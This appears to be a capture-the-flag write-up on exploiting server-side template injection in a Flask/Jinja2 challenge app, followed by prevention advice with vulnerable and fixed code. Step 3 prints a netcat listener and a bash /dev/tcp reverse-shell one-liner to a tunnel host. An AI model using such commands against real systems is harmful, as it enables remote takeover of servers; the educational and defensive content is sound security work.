## Solution

### Step 1: Testing and Investigating the Vulnerability

Once we identified the vulnerability, we need to determine which template engine is being used. Normally we'd check using browser extensions like Wappalyzer, but here it's much simpler. Looking at the source code, we find a `/scan` route:

```
http://chall.v1t.site:30300/scan
```

<img width="1064" height="481" alt="scan_rute" src="https://github.com/user-attachments/assets/7929feaf-e975-4452-9dc7-d2cd100f3a64" />


Here we can see information about how the application runs, the hosts, and most importantly: it's a Python application (probably Flask), likely using Jinja2 as the template engine, and it's running as **root** - which is excellent because we won't need privilege escalation.

### Step 2: Exploiting the Vulnerability

Now that we know this, we can move to the exploitation phase. We visit **HackTricks** to find potential payloads. This helps us:
- Bypass the template and its commands
- Escape the sandbox
- Import dangerous libraries
- Execute embedded code

```
HackTricks Web Resources:
https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
```

As we can see, the advantages this website provides are significant. We test and confirm it's indeed **Jinja2** by executing an encoded `whoami` command, which works. The same applies for `id`, etc.

**Workflow:** Encode everything in **Burp Suite's Decoder**, then send everything through the **Repeater**.

### Step 3: Reverse Shell

Once we've successfully exploited the system, we can see we have access to Linux. We'll use our Linux bash knowledge and prepare a listener:

```bash
nc -lvp 3337
```

Once prepared, we need to open a tunnel using either ngrok or in this case **pinggy**, and set the ports and IP (in this case, the domain):

```bash
bash -c "bash -i >& /dev/tcp/qewvg-187-190-238-97.a.free.pinggy.link/39155 0>&1"
```

Now we simply substitute the command in the payload, encode it, send it, and receive the reverse shell:

## How to avoid

To prevent **Server-Side Template Injection (SSTI)** attacks like this, implement the following security measures:

### 1. **Avoid User Input in Templates**
- **Never** pass user-controlled data directly to template rendering functions
- Treat all user input as untrusted data
- If user input must be displayed, use proper escaping mechanisms

### 2. **Use Sandboxed Template Engines**
- Configure Jinja2 with `SandboxedEnvironment` instead of regular `Environment`
- Restrict access to dangerous functions and methods
- Disable automatic escaping bypass methods

### 3. **Input Validation and Sanitization**
- Implement strict allowlists for acceptable input patterns
- Reject any input containing template syntax characters: `{{`, `}}`, `{%`, `%}`, `{#`, `#}`
- Use Content Security Policy (CSP) headers

### 4. **Principle of Least Privilege**
- **Never run web applications as root** (as seen in this challenge)
- Use dedicated service accounts with minimal permissions
- Implement proper containerization with restricted capabilities

### 5. **Implement Logic-less Templates**
- Separate business logic from presentation layer
- Pre-process all dynamic content before passing to templates
- Use logic-less template engines when possible

### Example Secure Implementation:

**Insecure Code (Vulnerable):**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/notes', methods=['POST'])
def notes():
    user_input = request.form.get('note')
    # VULNERABLE: Direct template rendering with user input
    template = f"<h1>Your note: {user_input}</h1>"
    return render_template_string(template)
```

**Secure Code (Fixed):**
```python
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

@app.route('/notes', methods=['POST'])
def notes():
    user_input = request.form.get('note', '')
    
    # Validate input
    if any(char in user_input for char in ['{{', '}}', '{%', '%}', '{#', '#}']):
        return "Invalid input detected", 400
    
    # Use proper template file with auto-escaping
    # Pass as data, not as template code
    return render_template('note.html', note=escape(user_input))
```

**Template file (note.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Your Note</title>
</head>
<body>
    <h1>Your note:</h1>
    <!-- Jinja2 auto-escapes by default -->
    <p>{{ note }}</p>
</body>
</html>
```

### 6. **Security Headers and WAF**
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```
